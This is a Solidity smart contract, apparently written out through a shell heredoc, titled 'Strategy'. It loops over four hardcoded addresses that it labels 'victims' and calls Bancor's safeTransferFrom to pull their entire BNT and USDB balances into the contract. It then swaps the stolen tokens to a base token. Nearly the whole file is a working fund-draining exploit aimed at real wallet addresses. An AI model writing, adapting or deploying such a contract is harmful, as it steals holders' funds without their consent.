// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DexUtils.sol";

interface IBancorNetwork {
    function safeTransferFrom(address _token, address _from, address _to, uint256 _value) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract Strategy {
    address public constant BANCOR_NETWORK = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address public constant BNT = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C;
    address public constant USDB = 0x309627Af57f357DE94881738EF167121De711B6a;

    // List of potential victims from historical data
    address[] public victims = [
        0x55977304c14Eccd6996F924697169d63E213093A,
        0xf05e96f90486664f622724649a06f45f6704eB0d,
        0x762970969C0357406412D3dE882985122b3a95CE,
        0x12598d2Fd8848f58D236701C905596221078b8b1
    ];

    function run() public {
        for (uint i = 0; i < victims.length; i++) {
            address victim = victims[i];

            // Try BNT
            uint256 bntBal = IERC20(BNT).balanceOf(victim);
            if (bntBal > 0) {
                try IBancorNetwork(BANCOR_NETWORK).safeTransferFrom(BNT, victim, address(this), bntBal) {
                    DexUtils.swapExcessTokensToBaseToken(BNT);
                } catch {}
            }

            // Try USDB
            try IERC20(USDB).balanceOf(victim) returns (uint256 usdbBal) {
                if (usdbBal > 0) {
                    try IBancorNetwork(BANCOR_NETWORK).safeTransferFrom(USDB, victim, address(this), usdbBal) {
                        DexUtils.swapExcessTokensToBaseToken(USDB);
                    } catch {}
                }
            } catch {}
        }
    }
}
EOF

